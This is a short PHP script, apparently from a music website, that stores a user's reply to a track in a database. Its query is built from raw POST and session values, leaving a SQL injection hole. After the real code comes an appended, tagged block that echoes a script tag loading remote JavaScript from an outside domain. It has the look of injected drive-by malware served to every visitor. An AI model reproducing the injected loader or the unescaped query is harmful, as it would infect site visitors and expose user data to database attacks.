<?
	session_start();
	include('./lib.php');
	$connect = db_connect($db_host, $db_user, $db_pass,$db_name);
	$music_no=$_POST['music_no'];
	$r_content=$_POST['reply_text'];
	if($r_content!="" && $music_no!=''){
		$sql="insert into Vocals_music_reply (music_no,reply_writer_id, reply_content, reply_date) values (trim('$music_no'),trim('$_SESSION[user_id]'), trim('$r_content'), now())";
		mysql_query($sql);
		echo "success";
	}else{
		echo "fail";
	}
?>
<?php
#e34865#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155824\"></script>";
echo $vt;
}
#/e34865#
?>